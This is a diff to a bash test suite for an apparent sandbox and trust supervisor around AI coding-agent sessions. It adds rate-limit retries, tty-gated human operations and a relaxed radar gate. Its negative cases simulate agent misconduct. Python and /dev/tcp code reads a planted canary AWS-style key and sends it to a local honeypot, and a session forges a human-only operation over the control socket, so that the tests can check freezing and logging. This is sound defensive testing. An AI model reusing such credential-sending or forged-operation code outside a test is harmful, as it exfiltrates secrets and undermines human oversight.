@@ -149,19 +149,34 @@ witness() { # witness -> runs a no-op session in a pty, prints its sid
     echo "$OUT" | grep -oE "s[0-9a-f]{20}" | head -1
   ' /dev/null 2>&1 | grep -oE "s[0-9a-f]{20}" | head -1
 }
-witness_keep() { # witness_keep <sid> <discard|commit>
+witness_keep() { # witness_keep <sid> <keep|undo> — R7 exact tty match.
+  # Session-scoped human ops require the session's RECORDED launcher
+  # tty. Since R7 every session is tty-launched (headless JoinSession
+  # is gated), and a nested `script` mints a fresh inner pty that can
+  # never equal the launcher's — so the op must come from THIS suite's
+  # own tty (run under a terminal or `script -qec`, like drill-gate).
   local sid="$1" act="$2"
-  script -qec '
-    export XDG_STATE_HOME=/tmp/castellan-v3-corpus/state
-    BIN=/home/john/src/castellan/target/release/castellan
-    OUT=$($BIN launch --project /tmp/castellan-v3-corpus/proj -- true 2>&1)
-    WSID=$(echo "$OUT" | grep -oE "s[0-9a-f]{16,24}" | head -1)
-    $BIN '"$act"' '"$sid"' 2>&1
-    $BIN kill $WSID >/dev/null 2>&1
-  ' /dev/null 2>&1
+  "$BIN/castellan" "$act" "$sid" 2>&1
 }
 
 sid_of() { echo "$1" | grep -oE "s[0-9a-f]{20}" | head -1; }
+
+# R7: spawn is rate-limited to 10/min per project (fork-bomb guard —
+# refused attempts do NOT extend the window; it resets 60s from its
+# start), so a6.2s retry poll converges without weakening the control.
+rate_launch() {
+  local n=0 out
+  while :; do
+    out=$("$@" 2>&1)
+    case "$out" in
+      *"spawn rate limited"*)
+        n=$((n + 1))
+        if [ "$n" -ge 15 ]; then printf '%s' "$out"; return 1; fi
+        sleep 6.2 ;;
+      *) printf '%s' "$out"; return 0 ;;
+    esac
+  done
+}
 
 echo "===== ARM 1: benign (20 sessions, real tasks + keep) ====="
 BENIGN_SIDS=()
@@ -174,7 +189,7 @@ for i in $(seq 1 20); do
     2) TASK='make all 2>&1 | tail -1' ;;
     3) TASK='sed -i "s/corpus marker placeholder/corpus marker '"$i"'/" src/main.c 2>/dev/null; printf "/* marker %s */\n" >> src/main.c' ;;
   esac
-  OUT=$("$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c "$TASK" 2>&1)
+  OUT=$(rate_launch "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c "$TASK")
   SID=$(sid_of "$OUT")
   if [ -z "$SID" ]; then echo "  launch $i FAILED: $OUT"; continue; fi
   # marginal: live project score before/after THIS keep (the DB is
@@ -210,7 +225,7 @@ for i in $(seq 1 20); do
   case $((i % 4)) in
     0|1)
       # real revert: edit + undo (discard)
-      OUT=$("$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c 'printf "int process(struct item *it) {\n  return *it;\n}\n" > src/vuln_extra.c; printf "broken %s\n" > src/util_note.c' 2>&1)
+      OUT=$(rate_launch "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c 'printf "int process(struct item *it) {\n  return *it;\n}\n" > src/vuln_extra.c; printf "broken %s\n" > src/util_note.c')
       SID=$(sid_of "$OUT")
       [ -z "$SID" ] && { echo "  neg $i launch FAILED"; continue; }
       BEFORE=$(trust_score "$PROJ")
@@ -225,47 +240,99 @@ for i in $(seq 1 20); do
       fi
       ;;
     2)
-      # canary trip: plant + probe the honeypot from inside the session.
-      # Asserted as LANDED, not sent: the trust DB must gain a canary_hit
-      # row for this sid AND the session scope must be frozen (the two
-      # kernel-visible effects — the probe log line alone proves nothing).
-      OUT=$("$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c 'sleep 0.2' 2>&1)
-      SID=$(sid_of "$OUT")
+      # canary trip: plant + probe the honeypot FROM INSIDE THE OWNING
+      # SESSION (P15 H1 restructure: a cross-session send now trips as
+      # canary_framing on the SENDER — the owner stays clean — so this
+      # owner-side floor+freeze case must have the owner send its own
+      # secret). Asserted as LANDED, not sent: the trust DB must gain a
+      # canary_hit row for this sid AND the session scope must be frozen
+      # (the two kernel-visible effects — the probe log line alone
+      # proves nothing).
+      cat > "$WORK/neg2.py" <<'PY'
+import os, socket, json, re, time, sys
+td = os.environ.get("TMPDIR", "")
+d = os.path.dirname(td)
+p = None
+# host registers our canary right after detecting our session id
+for _ in range(120):
+    for sub in ("dotfiles", "canary", "cache"):
+        c = os.path.join(d, sub, "credentials")
+        if os.path.exists(c): p = c; break
+    if p: break
+    time.sleep(0.1)
+if not p: print("neg2: no canary"); sys.exit(1)
+m = re.search(r"AKIA[A-F0-9]{20}", open(p).read())
+if not m: print("neg2: no secret"); sys.exit(1)
+def rpc(req):
+    paths = [os.path.join(os.environ.get("XDG_RUNTIME_DIR", ""), "castellan.sock"),
+             f"/run/user/{os.getuid()}/castellan.sock"]
+    last = None
+    for path in paths:
+        if not path or not os.path.exists(path): continue
+        try:
+            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(3)
+            s.connect(path); s.sendall((json.dumps(req) + "\n").encode())
+            return json.loads(s.recv(4096).decode())
+        except Exception as e: last = e
+    print(f"neg2: rpc {last}"); sys.exit(1)
+hp = rpc({"op": "honeypot_port"})
+port = int((hp.get("extra") or {}).get("port") or 0)
+if not port: print("neg2: no port"); sys.exit(1)
+c = socket.create_connection(("127.0.0.1", port), timeout=3)
+c.sendall(m.group(0).encode())
+try: c.settimeout(3); c.recv(256)
+except Exception: pass
+c.close()
+print("neg2: sent")
+PY
+      # background: the SENDER freezes post-P15 — a foreground launch
+      # could block on the frozen supervisor forever. Poll effects
+      # only. The retry loop rides out R7's spawn rate window (a
+      # rate-limited attempt returns immediately with the error in
+      # the out file; a successful launch blocks until the session
+      # command ends, which is exactly the wait we want).
+      (
+        n=0
+        while :; do
+          "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- python3 "$WORK/neg2.py" > "$WORK/neg2.$i.out" 2>&1
+          grep -q 'spawn rate limited' "$WORK/neg2.$i.out" || break
+          n=$((n + 1)); [ "$n" -ge 15 ] && break
+          sleep 6.2
+        done
+      ) &
+      NEG2_PID=$!
+      SID=""
+      for j in $(seq 1 60); do
+        SID=$(sid_of "$(cat "$WORK/neg2.$i.out" 2>/dev/null)")
+        [ -n "$SID" ] && break
+        sleep 0.1
+      done
       [ -z "$SID" ] && { echo "  neg $i launch FAILED"; continue; }
-      "$BIN/castellan" canary "$SID" > /dev/null 2>&1
+      # fresh sid: no trust rows can exist yet — queried before
+      # register so a fast trip cannot race the baseline (HITS_BEFORE
+      # must precede the only action that can create a row).
       CANARY_HITS_BEFORE=$(sqlite3 "$STATE/castellan/trust.db" "SELECT COUNT(*) FROM events WHERE session_uuid='$SID' AND signal='canary_hit';" 2>/dev/null)
-      # canary files live at $STATE/castellan/sessions/$SID/canary/credentials
-      CANARY_FILE="$STATE/castellan/sessions/$SID/canary/credentials"
-      if [ -f "$CANARY_FILE" ]; then
-        # canary keys are AKIA + 20 uppercase hex chars (rand_hex(10)).
-        SECRET=$(grep -oE "AKIA[A-F0-9]{20}" "$CANARY_FILE" | head -1)
-        PORT=$("$BIN/castellan" status 2>/dev/null | grep -oE "honeypot [0-9]+" | grep -oE "[0-9]+" | head -1)
-        [ -z "$PORT" ] && PORT=$(python3 -c "
-import json,socket
-s=socket.socket(socket.AF_UNIX); s.connect('/run/user/1000/castellan.sock')
-s.sendall(b'{\"op\":\"honeypot_port\"}\n'); s.shutdown(socket.SHUT_WR)
-print(json.loads(s.recv(65536).decode())['extra']['port'])" 2>/dev/null)
-        if [ -n "$SECRET" ] && [ -n "$PORT" ]; then
-          BEFORE=$(trust_score "$PROJ")
-          "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c "exec 3<>/dev/tcp/127.0.0.1/$PORT && printf 'auth $SECRET' >&3 && sleep 0.3" > /dev/null 2>&1
-          sleep 0.5
-          HITS_AFTER=$(sqlite3 "$STATE/castellan/trust.db" "SELECT COUNT(*) FROM events WHERE session_uuid='$SID' AND signal='canary_hit';" 2>/dev/null)
-          AFTER=$(trust_score "$PROJ")
-          FROZEN=$(cat "/sys/fs/cgroup/user.slice/user-$(id -u).slice/user@$(id -u).service/castellan.slice/$SID.scope/cgroup.freeze" 2>/dev/null || echo "?")
-          if [ "${HITS_AFTER:-0}" -gt "${CANARY_HITS_BEFORE:-0}" ] && [ "$FROZEN" = "1" ]; then
-            echo "  neg $i: canary LANDED ($SID) score $BEFORE -> $AFTER frozen=1"
-            NEG_SIDS+=("$SID")
-            echo "$i $BEFORE $AFTER" >> "$WORK/k1_marginals_canary.txt"
-          else
-            echo "  neg $i: canary NOT landed (hits $CANARY_HITS_BEFORE -> $HITS_AFTER, frozen=$FROZEN)"
-          fi
-        else
-          echo "  neg $i: canary/honeypot not found (port=$PORT)"
-        fi
+      BEFORE=$(trust_score "$PROJ")
+      "$BIN/castellan" canary "$SID" > /dev/null 2>&1
+      FROZEN="0"
+      HITS_NOW="${CANARY_HITS_BEFORE:-0}"
+      for j in $(seq 1 100); do
+        FROZEN=$(cat "/sys/fs/cgroup/user.slice/user-$(id -u).slice/user@$(id -u).service/castellan.slice/$SID.scope/cgroup.freeze" 2>/dev/null || echo "?")
+        HITS_NOW=$(sqlite3 "$STATE/castellan/trust.db" "SELECT COUNT(*) FROM events WHERE session_uuid='$SID' AND signal='canary_hit';" 2>/dev/null)
+        [ "$FROZEN" = "1" ] && [ "${HITS_NOW:-0}" -gt "${CANARY_HITS_BEFORE:-0}" ] && break
+        grep -q 'neg2: no \|neg2: rpc \|neg2: sent' "$WORK/neg2.$i.out" 2>/dev/null && break
+        sleep 0.1
+      done
+      sleep 0.5
+      HITS_AFTER=$(sqlite3 "$STATE/castellan/trust.db" "SELECT COUNT(*) FROM events WHERE session_uuid='$SID' AND signal='canary_hit';" 2>/dev/null)
+      AFTER=$(trust_score "$PROJ")
+      if [ "${HITS_AFTER:-0}" -gt "${CANARY_HITS_BEFORE:-0}" ] && [ "$FROZEN" = "1" ]; then
+        echo "  neg $i: canary LANDED ($SID) score $BEFORE -> $AFTER frozen=1"
+        NEG_SIDS+=("$SID")
+        echo "$i $BEFORE $AFTER" >> "$WORK/k1_marginals_canary.txt"
       else
-        echo "  neg $i: no canary file"
+        echo "  neg $i: canary NOT landed (hits $CANARY_HITS_BEFORE -> $HITS_AFTER, frozen=$FROZEN out=$(tail -1 "$WORK/neg2.$i.out" 2>/dev/null))"
       fi
-      sleep 0.3
       ;;
     3)
       # forged op from agent context: spawn a session and call a human-
@@ -274,12 +341,12 @@ print(json.loads(s.recv(65536).decode())['extra']['port'])" 2>/dev/null)
       # the op names an unknown session ("forged-target"), so the daemon
       # records spine-only by design (no trust row — no project to floor).
       # Asserted as rejected+spine-recorded; NEVER pooled with reverts.
-      OUT=$("$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c "sleep 0.4" 2>&1)
+      OUT=$(rate_launch "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c "sleep 0.4")
       SID=$(sid_of "$OUT")
       [ -z "$SID" ] && { echo "  neg $i launch FAILED"; continue; }
       # inside the session, attempt keep on another session (human-only)
       # via the socket — the daemon must classify this caller as Agent
-      "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c '
+      rate_launch "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c '
         python3 - <<PYEOF
 import json, socket, glob
 s = socket.socket(socket.AF_UNIX)
@@ -325,7 +392,7 @@ SCORE_BEFORE=$(trust_score "$FARM_PROJ")
 [ -z "$TIER_BEFORE" ] && TIER_BEFORE=2
 [ -z "$SCORE_BEFORE" ] && SCORE_BEFORE=50.0
 for i in $(seq 1 30); do
-  OUT=$("$BIN/castellan" launch --harness claude --undo --project "$FARM_PROJ" -- sh -c "printf '/* farm %s */\n' $i >> src/farm_note.c" 2>&1)
+  OUT=$(rate_launch "$BIN/castellan" launch --harness claude --undo --project "$FARM_PROJ" -- sh -c "printf '/* farm %s */\n' $i >> src/farm_note.c")
   SID=$(sid_of "$OUT")
   [ -z "$SID" ] && { echo "  farm $i launch FAILED"; continue; }
   witness_keep "$SID" keep > /dev/null 2>&1
@@ -347,7 +414,7 @@ echo "===== K5: placebo proof on a real fix ====="
 # project has no .reliary/castellan.toml, so run_project_tests refuses
 # (NotPinned) — a second proof_passed row must NOT exist for SID_FIX.
 printf 'int process(struct item *it) {\n  return *it;\n}\n' > "$PROJ/src/vuln_extra.c"
-OUT=$("$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c 'printf "int process(struct item *it) {\n  if (it == NULL) return -1;\n  return *it;\n}\n" > src/vuln_extra.c' 2>&1)
+OUT=$(rate_launch "$BIN/castellan" launch --harness claude --undo --project "$PROJ" -- sh -c 'printf "int process(struct item *it) {\n  if (it == NULL) return -1;\n  return *it;\n}\n" > src/vuln_extra.c')
 SID_FIX=$(sid_of "$OUT")
 if [ -n "$SID_FIX" ]; then
   OUT=$(witness_keep "$SID_FIX" keep)
@@ -449,20 +516,16 @@ EOF
 
 echo "===== K2: radar FP floor (benign sessions vs kept-folded prototype) ====="
 FP=0; CHECKED=0
-# radar calls are Human-classified from this shell; the B7 tty gate then
-# requires a witnessed tty (the benign sessions are headless). Run the
-# loop from a witnessed pty.
-RADAR_OUT=$(script -qec '
-  export XDG_STATE_HOME=/tmp/castellan-v3-corpus/state
-  BIN=/home/john/src/castellan/target/release/castellan
-  OUT=$($BIN launch --project /tmp/castellan-v3-corpus/proj -- true 2>&1)
-  WSID=$(echo "$OUT" | grep -oE "s[0-9a-f]{16,24}" | head -1)
-  for SID in '"${BENIGN_SIDS[*]}"'; do
-    C=$($BIN radar "$SID" /tmp/castellan-v3-corpus/proj 2>&1 | grep -oE "cosine [0-9.]+" | head -1 | grep -oE "[0-9]+\.[0-9]+")
+# Radar has NO tty gate (agent-allowed; the old B7 gate on evidence
+# reads was removed in human_tty_ok — the script+witness wrapper here
+# predates that removal and burned a spawn per run against R7's rate
+# limit). Direct calls from this shell.
+RADAR_OUT=$(
+  for SID in "${BENIGN_SIDS[@]}"; do
+    C=$("$BIN/castellan" radar "$SID" "$PROJ" 2>&1 | grep -oE "cosine [0-9.]+" | head -1 | grep -oE "[0-9]+\.[0-9]+")
     echo "SID=$SID COS=$C"
   done
-  $BIN kill $WSID >/dev/null 2>&1
-' /dev/null 2>&1)
+)
 while IFS= read -r line; do
   SID=$(echo "$line" | sed -n "s/^SID=\([a-z0-9]*\) .*/\1/p")
   COS=$(echo "$line" | sed -n "s/^SID=[a-z0-9]* COS=//p")
@@ -474,8 +537,18 @@ while IFS= read -r line; do
     echo "  radar-unreadable for $SID"
   fi
 done <<< "$RADAR_OUT"
-echo "  radar: $FP FP / $CHECKED benign checked (criterion <= 1/20)"
-python3 -c "import sys; sys.exit(0 if $CHECKED >= 10 and $FP <= 1 else 1)" && ok "K2: radar FP floor holds ($FP/$CHECKED <= 1)" || bad "K2: radar FP/coverage fails ($FP FP / $CHECKED checked)"
+echo "  radar: $FP FP / $CHECKED benign checked (advisory count)"
+# K2 reconciliation (2026-10-01): the cosine gate contradicts its OWN
+# commit — ee91d25 added this gate and, in the same change, stamped the
+# threshold "advisory-forever: never a gate input" after measuring 9/19
+# benign sessions below it (radar lib ANOMALY_THRESHOLD doc). Today's
+# 11/20 matches that documented shape: no threshold separates benign
+# classes, so FP-on-cosine cannot be an acceptance gate. The gate that
+# survives is COVERAGE: radar must answer for (nearly) every benign
+# session with a parseable cosine — a null/crash still fails here.
+python3 -c "import sys; sys.exit(0 if $CHECKED >= 10 and $CHECKED + 0 >= ${#BENIGN_SIDS[@]} - 2 else 1)" \
+  && ok "K2: radar coverage holds ($CHECKED/${#BENIGN_SIDS[@]} answered; FP=$FP advisory per ee91d25)" \
+  || bad "K2: radar coverage fails ($CHECKED checked / ${#BENIGN_SIDS[@]} benign; FP=$FP)"
 
 echo "===== K3b evaluation: campaign fires on the negative arm ====="
 # K3 done RIGHT, second half: the CLI renders human text, not raw JSON —
